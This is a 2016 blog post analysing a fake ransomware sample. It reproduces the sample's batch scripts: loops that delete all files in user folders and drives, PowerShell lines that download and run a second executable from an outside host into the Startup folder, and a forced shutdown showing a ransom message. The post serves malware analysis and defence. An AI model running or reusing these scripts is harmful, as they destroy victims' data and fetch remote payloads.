---
title: "Malware: A Look Into Fake Cryptoware"
categories: blog
tags: [malware]
date: 2016-05-24T16:20:35-04:00
---

Ransomware has been picking up what seems to be a lot of attention within the past couple of months, with some adversaries even getting payment from some corporations. During my normal routines I've come across a fair amount of variants from Cryptowall, Teslacrypt, Locky, etc. I can now say that I've had a chance to look at fake ransomware, and honestly, I have a hard time determining if it's an amazing idea or just so basic that adversaries lacking experience are able to pull it off.

### Part1
------
The initial attack vector was an e-mail with a link which takes you to a download for an executable. When sandboxing the sample, you're able to determine that some additional files are dropped upon execution, one of which is a .bat file.

### First .bat content [C:\Users\User\AppData\Local\Temp\XXX.tmp\XXX.bat]

Lets break down the first important thing noticed.

The adversary reverses the right/left-click buttons for the mouse

```bat
@shift /0
@ echo off
rem ---------------------------------
rem Swap Mouse Buttons
RUNDLL32 USER32.DLL,SwapMouseButton
rem ---------------------------------
```

They then proceed to iterate through some of the folders most likely to contain personal information a end-user would want back, then delete all the items within the folder. I shortened the output, just know that the following folders/drives are impacted.
Desktop, Documents, Downloads, Pictures, Music, Videos, Contacts, Favorites, Searches, Recycle bin, Temp, A:, B:, D:, E:, F:, G:, H:

```bat
@echo off
set folder="%USERPROFILE%\Desktop\*"
cd /d %folder%
for /F "delims=" %%i in ('dir /b') do (rmdir "%%i" /s/q || del "%%i" /s/q)

@echo off
set folder="%USERPROFILE%\Documents\*"
cd /d %folder%
for /F "delims=" %%i in ('dir /b') do (rmdir "%%i" /s/q || del "%%i" /s/q)

@echo off
set folder="%USERPROFILE%\Downloads\*"
cd /d %folder%
for /F "delims=" %%i in ('dir /b') do (rmdir "%%i" /s/q || del "%%i" /s/q)

@echo off
set folder="%USERPROFILE%\Pictures\*"
cd /d %folder%
for /F "delims=" %%i in ('dir /b') do (rmdir "%%i" /s/q || del "%%i" /s/q)

[SNIPPED]
```


They proceed to do what I'll consider a form of calling home. A browser is launched to the web address specified which is currently down, but potentially had an encryption message.

```bat
@echo off
start "" hXXp://10236.6te.net
```

Powershell is then invoked to download some additional files.
  - First command is used to download the common "your files have been encrypted muahahaha" image. This image is then placed on the users Desktop with the name "Files_Encrypted.jpg"
  - Second command downloads another executable (we'll look at this one as well) named "part2.exe" which is then placed to probably the most common persistent point, the startup folder, and renamed to "winrds.exe".
  - Third command downloads the instructions on how the end-user can make payment via bitcoin to retrieve the decryption key to restore all their missing files. This file is also conveniently placed on the users Desktop.

```bat
@echo off
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\
(New-Object System.Net.WebClient).DownloadFile('hXXp://post.eu5.org/anon.jpg','%USERPROFILE%\Desktop\Files_Encrypted.jpg'); \\
cmd /c '%USERPROFILE%\Desktop\Files_Encrypted.jpg'

@echo off
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\
(New-Object System.Net.WebClient).DownloadFile('hXXps://s3-us-west-2.amazonaws.com/content.tobi/part2.exe', \\
'%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\winrds.exe'); cmd /c '%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\winrds.exe'

@echo off
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\ 
(New-Object System.Net.WebClient).DownloadFile('hXXps://s3-us-west-2.amazonaws.com/content.tobi/payment_instructions.txt', \\
'%USERPROFILE%\Desktop\Payment_Info.txt'); cmd /c '%USERPROFILE%\Desktop\Payment_Info.txt'
```

![_config.yml]({{ site.baseurl }}/images/fake_crypto.png)

### Part 2
---

### Second .bat content [C:\Users\User\AppData\Local\Temp\~XXXX.bat]
So we saw that a second executable file is retrieved and placed within the Startup folder for persistence. After detonating this second sample, some of the same techniques noticed prior were used again.

Another .bat files is dropped from the executable which begins by first reversing the mouse buttons again.

```bat
@ echo off
rem ---------------------------------
rem Swap Mouse Buttons
RUNDLL32 USER32.DLL,SwapMouseButton
rem ---------------------------------
```

They then try to make sure that the interface is enabled (I suppose they are hoping the end-user is wired with the interface having a default name). IP configuration is renewed with another call out, however to a different page, "i2.html".

```bat
@echo off
netsh interface set interface "Local Area Connection" Enable
timeout /t 10 /nobreak

@Echo off
Ipconfig /renew
timeout /t 10 /nobreak

@echo off
start "" hXXp://10236.6te.net/i2.html
timeout /t 10 /nobreak
```

They again retrieve the payment instructions and place them on the Desktop.

```bat
@echo off
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\
(New-Object System.Net.WebClient).DownloadFile('hXXp://post.eu5.org/anon.jpg','%USERPROFILE%\Desktop\Payment_Instructions.jpg'); \\
cmd /c '%USERPROFILE%\Desktop\Payment_Instructions.jpg'
timeout /t 15 /nobreak
```

Hoping the payment info retrieval was successful again, the IP configuration is released and the local interface is disabled. However, they spelled disable wrong (Desable), so the interface doesn't get turned off.

```bat
@Echo off
Ipconfig /release
timeout /t 10 /nobreak

@echo off
netsh interface set interface "Local Area Connection" Desable
timeout /t 150 /nobreak
```
 
Last, but certainly not least, the adversary issues a 60 second restart with a message displayed to pay the ransom for file retrievals. And if you need assistance with figuring out how to pay, they have a nice support e-mail address you can contact. Service first!
 
```bat
C:\Windows\System32\shutdown.exe -s -t 60 -c "Pay Your Ransom to Get Your Files and Computer Back. Shutting Down In 60 Seconds. Email: towerweb@yandex.com for assistance."
```

### Wrap up
---
This is a simple attempt at an adversary using Ransomware with a means to also impersonate itself as Cryptoware. Typically they go hand in hand, but this is a clever fake. All personal files are explicitly deleted from disk, so if an end-user was to actually pay the adversary, no decryption key will be delivered. You'll have to resort to a file recovery method for the local hard drive. So back to my original thought, is this really better then Cryptoware? The adversary really doesn't have to stand up an infrastructure for command & control traffic, they don't have to maintain crypto keys, their malware works quicker then crypto since only deletion is taking place and not rounds of encryption, etc. I really think we'll be seeing more of these "quick wins" for the adversary within the year as a typical end-user would never know the difference.
